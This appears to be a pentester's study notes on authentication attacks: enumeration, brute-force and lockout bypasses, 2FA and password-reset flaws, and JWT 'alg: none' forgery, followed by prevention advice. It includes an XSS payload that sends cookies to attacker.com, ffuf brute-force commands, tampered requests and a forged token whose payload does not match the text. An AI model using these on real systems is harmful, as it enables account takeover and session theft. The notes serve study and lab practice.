# Authentication

Authentication is the process of verifying the identity of a user or client.

## Authentication vs. Authorization?

Authentication is the process of verifying that a user is who they claim to be. Authorization involves verifying whether a user is allowed to do something.

## How do authentication vulnerabilities arise?

* Weak auth against brute-force attacks.
* Broken auth (logic flaws or poor coding that allow auth bypass)

## What is the impact of vulnerable authentication?

If they compromise an admin/system account -> full app control and potentially gain access to internal infrastructure.

Even low-level accounts may have sensitive data or increase attack surface to internal pages.

## Vulnerabilities in password-based login

{% code overflow="wrap" fullWidth="true" %}
```sh
# Brute force attacks
Trial and error with wordlists of user/pass. They could use public info to refinate and make more educated guesses.

# Brute-forcing usernames
firstname.lastname@somecompany.com
admin
administrator
Check whether the website discloses potential usernames publicly / analyze HTTP responses to see if emails disclosed

# Brute-forcing passwords
Check password policy (min length, max length, at least one special char)
# Use a basic knowledge of human behavior
mypassword not allowed -> Mypassword1! / Myp4$$w0rd / Mypassword1! / Mypassword1? / Mypassword2!

# Username enumeration
Identify valid usernames -> log in with right user wrong password, sign up as an existent user
When bruteforcing login page, check -> Status codes / Error messages / Response times (try also very long pwd)
EXAMPLE: try different users, see invalid user, bf w/ Intruder, find user (diff response) and then bf password
# Username enumeration via subtly different responses
EXAMPLE: bf user, Intruder > Grep-Extract error message, find subtly difference, use that user and bf password
# Username enumeration via response timing
EXAMPLE: if valid user -> longer password (increases response timing) so set 100 char password to test
If IP blocked -> Pitchfork for user and X-Forwarded-For if header is allowed (payload Numbers to change on every request)
If potential valid user found if high resp. time, try few times to know it consistently

# Flawed brute-force protection
- Locking account the attacker tries to access
- Blocking attacker IP
To bypass many failed attemps, log in to a valid account every few attempts to prevent this limit from ever being reached. 
Example: set Resource Pool > max concurrent requests to 1 to ensure they are sent in order.
Then build a user wordlist intercalating target user and valid user
After that, build password wordlist intercalating potential password and valid user password
Then Intruder > Pitchfork > Add payloads for user and password params

# Account locking
Responses from the server indicating that an account is locked can also help an attacker to enumerate usernames. 
Have candidate usernames that are likely to be valid. This could be through user enum or common user wordlist.
Decide on a very small shortlist of passwords. If account locking is after 3 attempts, choose max 3 passwords.
Try each of the selected passwords with each of the candidate usernames. This way, you can attempt to bf any account.
Account locking also fails to protect against credential stuffing attacks (user:pass obtained from leaks)
# EXAMPLE: Intruder > Clusterbomb > password=example$$ (add Payload Null payloads at the end to generate 5 pwd/user),
see responses and find which user is locked or too many attempts -> then retry w/ that user, Grep-Extract errors
# EXAMPLE2: Hydra w/ user wordlist and 5 passwords, then use Intruder > Sniper > Grep-Extract message error

# User rate limiting
Too many login requests within a short period of time causes your IP address to be blocked.
There are several ways an attacker can manipulate their apparent IP in order to bypass the block. 

# HTTP basic authentication
Authorization: Basic base64(username:password)
Unsafe, sends creds on every request, if HSTS not enabled is vulnerable to MithM, no bf protection, vulnerable to CSRF...
```
{% endcode %}

## Vulnerabilities in multi-factor authentication

Poorly implemented two-factor authentication can be beaten, or even bypassed entirely, just as single-factor authentication can.

The full benefits of multi-factor authentication are only achieved by verifying multiple **different** factors.

{% code overflow="wrap" fullWidth="true" %}
```sh
# Two-factor authentication tokens
SMS could be intercepted and is prone to SIM swapping (attacker obtains a SIM card with the victim phone number)


# Bypassing two-factor authentication
If you input pwd and then asked to enter a verification code on a separate page, user is in "logged in" step before
entering the code. TEST if you can skip and visit "logged-in only" pages in case web not check if you completed the MFA.
EXAMPLE: log in and when page asks for MFA, you try to skip it by visiting my-account or any other logged-in page


# Flawed two-factor verification logic
After user logged in, website does not adequately verify that the same user is completing the second step.
#For example, the user logs in with their normal credentials in the first step as follows:
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
# They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:
HTTP/1.1 200 OK
Set-Cookie: account=carlos

GET /login-steps/second HTTP/1.1
Cookie: account=carlos
# When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
# Attacker could log in using their own credentials but then change the value of the account cookie to any arbitrary username when submitting the verification code.
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456 
# EXAMPLE
Having valid creds -> log in, notice "user" parameter on cookie before 2FA -> change to target user and remove session id
before sending the request to generate 2FA code for our target user. Send 5+ times a code to see if MFA bf protection.
Bruteforce bf code removing again session id from request
Finally, forward the request with the right code and copy the session cookie (Cookie Editor) to browser and remove others


# Brute-forcing 2FA verification codes
Some websites logs a user out if they enter a certain number of incorrect verification codes. 
This is ineffective in practice because an advanced attacker can even automate this multi-step process 
by creating macros for Burp Intruder. The Turbo Intruder extension can also be used for this purpose. 
```
{% endcode %}

## Vulnerabilities in other authentication mechanisms

Users can typically change their password or reset their password when they forget it.

{% code overflow="wrap" fullWidth="true" %}
```sh
############ Keeping users logged in
"Remember me" or "Keep me logged in", often implemented with "remember me" token and stored as persistent cookie.
Best practice -> token impractical to guess / e.g. if it is a concatenation of user+password+timestamp, attacker
could create an account, deduce other user "remember me" token and bruteforce them.
Base64-encoding the token is not safe at all, and hashing might be dangerous if hash can be known or XSS hijacking
# EXAMPLE: check "Remember me" when log in, inspect "stay-logged-in" cookie, base64-decode to see it includes
cookie and hashed password. Craft all user:MD5(pass) options and bruteforce
Intruder > Payload processing > Hash:MD5  / Add Prefix: user: / Encode > Base64-encode
# In some rare cases, cookie is a hashed password and can be cracked offline
EXAMPLE: cookie with hashed password and XSS vuln on comments, we try to hijack another session by commenting this:
<img src=x onerror=this.src='https://attacker.com/?'+document.cookie;>

###########  Resetting user passwords
# Sending passwords by email
Not secure since emails can be intercepted and accounts are synced between different devices and insecure channels
# Resetting passwords using a URL
Ideally, every reset should generate a unique URL. Below is a bad example or a guessable endpoint and parameter
http://vulnerable-website.com/reset-password?user=victim-user
# Non-guessable token is a better implementation 
http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
However, some websites fail to also validate the token again when the reset form is submitted. 
Attacker could visit the reset form from their own account, delete the token, and leverage this page to reset 
an arbitrary user's password. '
EXAMPLE: Forgot password > enter our username > see an email is received > go to our email > go to reset link >
intercept reset link with data > change username to our target user to change its password for a known by us
# If URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning.
In this case, an attacker can potentially steal another user token and use it change their password. 
EXAMPLE: Forgot password? > See if supports X-Forwarded-Host header > if so, input there our attacking server and 
replace username parameter for our target username > check server logs to find the forgot-password token of target >
proceed to get reset email of our own user > replace temp-password-token for the stolen one and send to change pwd

############ Changing user passwords
Password change function -> dangerous if attacker can access it directly without being logged in as the victim user.
For example, if user is provided in a hidden field, an attacker might edit the value and use it to enum users and bf pass
EXAMPLE: change password has username parameter > input target user, whatever current password and newpassword1 and 
newpassword2 different -> then bf current pwd to obtain it
```
{% endcode %}

## Preventing attacks on your own authentication mechanisms

* Take care with user credentials. Never send any login data over unencrypted connections. No user or email disclosed on publicly accessible profiles or reflected in HTTP responses.
* Don't count on users for security. Effective password policy. Implement a simple password checker, which allows users to experiment with passwords and provides feedback about their strength in real time.
* Prevent username enumeration. Use identical, generic error messages, same HTTP responses and indistinguishable response times.
* Bf protection. IP-based user rate limiting, CAPTCHA.
* Triple-check your verification logic.
* Don't forget supplementary functionality. Be sure not to just focus on the central login pages and overlook additional functionality related to authentication. A password reset or change is just as valid an attack surface as the main login mechanism and, consequently, must be equally as robust.
* Implement proper multi-factor authentication. Using a dedicated device or app that generates the verification code directly. Make sure logic in 2FA checks is sound.









































## Username enumeration

{% code overflow="wrap" fullWidth="true" %}
```bash
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.141.250/customers/signup -mr "username already exists"

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.141.250/customers/login -fc 200
```
{% endcode %}

## Logic Flaw

Code checking **/admin** for permissions but circumvented accessing **/adMIn** and not checking them.

Use case: a **reset password email** being sent via GET. The PHP `$_REQUEST` variable is an array that contains data received from the query string and POST data. If the same key name is used for both the query string and POST data, the application logic for this variable favors POST data fields rather than the query string, so if we add another parameter to the POST form, we can control where the password reset email gets delivered. For this we just need to register an email with the proper syntax (customer.X.com or whatever nomenclature the company uses) and then get a reset for the real account we compromise.

## Cookie Tampering

Use case: change known/displayed admin **cookie** either on plaintext or base64 encoding.

## Dictionary attack

[https://portswigger.net/support/using-burp-to-brute-force-a-login-page](https://portswigger.net/support/using-burp-to-brute-force-a-login-page)

The very obvious method of attacking any login form is just to brute force the credentials. But in this kind of brute force, we don't simply try numbers or simple alphabets. What we do is take an existing dictionary of commonly used username/passwords and use those to see if we can find the right combination. This is known as **Dictionary Attack.**

To perform a dictionary attack we can use a lot of tools like Hydra or Medusa but the issue with these CLI tools is that we need to provide a lot of arguments to them started and that could be confusing. That is why when trying a dictionary attack on a web application/form it's better to use Burp Suite. In Burp we can capture the login request and then use intruder to perform the attack.

**Capture the request, enter values for parameters, start a Dictionary Attack and see if there is a request with a different (bigger or smaller) response (Length) than all of the others.**

## Re-registration

Example: say there is an existing user with the name **admin** and now we want to get access to their account so what we can do is try to re-register that username but with slight modification. We are going to enter " admin" (notice the space in the starting). Now when you enter that in the username field and enter other required information like email id or password and submit that data. It will actually register a new user but that user will have the same right as normal admin. And that new user will also be able to see all the content present under the user **admin**.

## JSON Web Token (JWT)

{% tabs %}
{% tab title="Overview" %}
JSON Web Token (JWT) is one of the commonly used methods for authorization. This is a kind of cookie that is generated using HMAC hashing or public/private keys. So unlike any other kind of cookie, it lets the website know what kind of access the currently logged in user has. The only special thing about JWT is that they are in JSON format (after decoding).

JWT can be divided into 3 parts separated by a dot(.)\


1\) **Header:** This consists of the algorithm used and the type of the token.

`{  "alg": "HS256", "typ": "JWT"}`

alg could be HMAC, RSA, SHA256 or can even contain None value.

2\) **Payload:** This is part that contains the access given to the certain user etc. This can vary from website to website, some can just have a simple username and some ID and others could have a lot of other details.

3\) **Signature:** This is the part that is used to make sure that the integrity of the data was maintained while transferring it from a user's computer to the server and back. This is encrypted with whatever algorithm or **alg** that was passed in the header's value. And this can only be decrypted with a predefined secret(which should be difficult to)

Now to put all the 3 part together we base64 encode all of them separated by a dot(.) so it would look something like:

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

{% hint style="info" %}
This example was taken from [jwt.io](https://jwt.io/#debugger-io) and you should check that website out if you want to learn more about JWT.﻿
{% endhint %}
{% endtab %}

{% tab title="Exploitation﻿" %}
If used properly this is a very secure way of authorization but the problem is with using is "properly". A lot of developers misconfigure their system leaving it open to exploitation.

Now one of the methods to exploit this is to perform a brute force/dictionary attack and find the secret used for encrypting the JWT token and then used that to generate new tokens. But here we are not going to do that, we are going to see a very amazing way of exploiting this.

If you remember, in the Header section I said that the **alg** can be whatever the algorithm is used and also it can be **None** if no encryption is to be used. Now, this should not be used when the application is in production but again the problem of misconfiguration comes in and make the application vulnerable to this kind of attack. The attack is that an attacker can log in as low privilege user says **guest** and then get the JWT token for that user and then decode the token and edit the headers to use set **alg** value to **None**. This would mean that no encryption has to be used therefore the attacker wouldn't need to the secret used for encryption.
{% endtab %}

{% tab title="Practical" %}
Let's see this method in practice. For this challenge visit the port 5000.

﻿It is a very simple login page and in that, you can log in via two users: user and user2. Now first let's try to login with the credentials of **user:user** . To do so first enter those credentials then click on the **Authenticate** button and then enable the capture in burp suite and then click on **the Go** button. In the burp tab, you should see a request to **/protected** ﻿and there you'll see the JWT token.

![](<../../.gitbook/assets/image (103).png>)

Now take this JWT token and then you can decode it part by part.

So if we decode the first part, which will do: `{"typ":"JWT","alg":"HS256"}`

and decoding the 2nd part, we will get: `{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":1}`

If you try to decode the 3rd part then you'll get some gibberish. But that is okay we only need the first and the second part.

Now if we notice the **identity** value that is probably being used to identify the user but if you'll just edit that then it won't work because as I said the 3rd part is encrypted. So to bypass this we will make changes in the header as well as the value of the identity.

Encode the following string with base64 and that will be our first part

`{"typ":"JWT","alg":"NONE"}`

For the second part, we'll encode the following string:

`{"exp":1586620929,"iat":1586620629,"nbf":1586620629,"identity":2}`

Notice how we changed the value of **identity** from **1** to **2**.Since we placed the alg value to None we don't have to add a 3rd part or the encrypted value so we can just put a dot(.) after 2nd part and leave it like that. So the final string would look like:

`eyJ0eXAiOiJKV1QiLCJhbGciOiJOT05FIn0K.eyJleHAiOjE1ODY3MDUyOTUsImlhdCI6MTU4NjcwNDk5NSwibmJmIjoxNTg2NzA0OTk1LCJpZGVudGl0eSI6MH0K.`\
Now open the developer's tools in your browser and edit the stored cookie of the website to this new one and then just press the **Go** button and you'll notice that it will prompt "Welcome user2: guest2".

In a similar manner, you can try to play and find other users on the website.

This kind of misconfiguration in the authentication system is common and could be exploited to escalate privileges or steal information.

{% hint style="info" %}
For both header and payload, remove final "=". Use an online Base64 encoder.
{% endhint %}
{% endtab %}
{% endtabs %}
